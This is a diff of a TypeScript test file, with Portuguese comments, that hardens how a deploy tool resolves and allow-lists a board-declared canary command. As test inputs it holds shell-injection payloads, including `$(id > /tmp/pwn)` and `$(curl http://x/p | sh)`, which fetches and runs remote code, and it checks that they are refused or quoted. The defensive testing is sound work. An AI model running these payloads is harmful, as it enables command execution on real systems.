@@ -33,16 +33,20 @@ const surface = (over: Record<string, unknown> = {}) => ({
   ...over,
 });
 
+// A POLÍTICA do passo privilegiado que o alvo destes casos declara em settings.yaml → deploy (nomes inventados): o task
+// runner `just` com a receita `publish-static`, e o CLI de publicação `vercel`. A ferramenta não traz nenhum de fábrica.
+const POLITICA = { launchers: ["just", "vercel"], recipeRunners: ["just"], recipes: ["publish-static"] };
+
 describe("resolveCanaryCommand — quem responde pela superfície deste board", () => {
   it("o board declara o seu ⇒ é o dele (um repo pode publicar N produtos em N superfícies)", () => {
     // A precedência board-primeiro é a razão de ser deste resolvedor e não mudou. O que mudou (hardening)
     // é que a declaração do BOARD passa pela régua: ela sai RE-CITADA, palavra por palavra.
     expect(
       resolveCanaryCommand(
-        { deploy: { canaryCommand: "just sync-web-terminal" } },
-        { deploy: { canaryCommand: "node scripts/ops/surface-check.mjs" } },
+        { deploy: { canaryCommand: "just publish-static" } },
+        { deploy: { ...POLITICA, canaryCommand: "node scripts/ops/surface-check.mjs" } },
       ),
-    ).toBe(`'just' 'sync-web-terminal'`);
+    ).toBe(`'just' 'publish-static'`);
   });
 
   it("board sem declaração ⇒ o default do deployment (uma face compartilhada se declara UMA vez)", () => {
@@ -73,7 +77,7 @@ describe("resolveCanaryCommand — quem responde pela superfície deste board", 
 // E o canário roda em DOIS lugares (o verify pós-deploy e o tick do steward), os dois com o env do serviço.
 // ─────────────────────────────────────────────────────────────────────────────────────────────────
 describe("o canário declarado em board-data passa pela MESMA régua dos outros dois campos", () => {
-  const deploymentDefault = { deploy: { canaryCommand: "node scripts/ops/surface-check.mjs" } };
+  const deploymentDefault = { deploy: { ...POLITICA, canaryCommand: "node scripts/ops/surface-check.mjs" } };
 
   it("um INTERPRETADOR/caminho declarado como canaryCommand é recusado, e NADA é executado", async () => {
     const attacks = [
@@ -125,7 +129,7 @@ describe("o canário declarado em board-data passa pela MESMA régua dos outros 
   it("um canário de board AUTORIZADO roda RE-CITADO — o `/bin/sh -c` não expande `$(…)` nem `$VAR`", async () => {
     // A fronteira: o parser trata `"…"` como agrupamento literal, mas o shell que executa do outro lado
     // EXPANDE dentro de aspas duplas. Sem re-citação, alvo autorizado + payload no argumento = root.
-    const v = resolveCanaryVerdict({ deploy: { canaryCommand: `vercel deploy --msg "$(id > /tmp/pwn)"` } }, null);
+    const v = resolveCanaryVerdict({ deploy: { canaryCommand: `vercel deploy --msg "$(id > /tmp/pwn)"` } }, { deploy: POLITICA });
     expect(v.command).toBe(`'vercel' 'deploy' '--msg' '$(id > /tmp/pwn)'`);
     expect(v.command).not.toContain(`"$(`);
 
@@ -137,9 +141,22 @@ describe("o canário declarado em board-data passa pela MESMA régua dos outros 
   it("a cadeia do task runner vale aqui também — receita fora da allow-list é recusada", () => {
     // `just canary-check '<payload>'` era o vetor medido com `just --dry-run`: o runner interpola o
     // parâmetro COMO TEXTO na linha da receita, que vai para um shell.
-    for (const evil of [`just canary-check '$(curl http://x/p | sh)'`, `just sync-web-terminal '$(id -un)'`]) {
-      expect(resolveCanaryVerdict({ deploy: { canaryCommand: evil } }, null).command).toBeNull();
+    for (const evil of [`just canary-check '$(curl http://x/p | sh)'`, `just publish-static '$(id -un)'`]) {
+      expect(resolveCanaryVerdict({ deploy: { canaryCommand: evil } }, { deploy: POLITICA }).command).toBeNull();
     }
+    // CONTRAPROVA: a receita DECLARADA passa (a recusa acima é da cadeia, não do lançador)
+    expect(resolveCanaryVerdict({ deploy: { canaryCommand: "just publish-static" } }, { deploy: POLITICA }).command).toBe(`'just' 'publish-static'`);
+  });
+
+  it("SEM política declarada o canário de BOARD é recusado nomeando a chave — a ferramenta não traz lançador de fábrica", () => {
+    for (const settings of [null, {}, { deploy: { canaryCommand: "./padrao" } }]) {
+      const v = resolveCanaryVerdict({ deploy: { canaryCommand: "just publish-static" } }, settings);
+      expect(v.command).toBeNull();
+      expect(v.source).toBe("board");
+      expect(v.refusal).toMatch(/settings\.yaml → deploy\.launchers/);
+    }
+    // o canal do OPERADOR (settings.deploy.canaryCommand) não passa pela allow-list: segue valendo sem política
+    expect(resolveCanaryVerdict(null, { deploy: { canaryCommand: "./padrao" } })).toEqual({ command: "./padrao", source: "deployment", refusal: null });
   });
 
   it("NÃO-REGRESSÃO: o canaryCommand REAL de hoje (settings.yaml, canal do operador) roda VERBATIM", async () => {
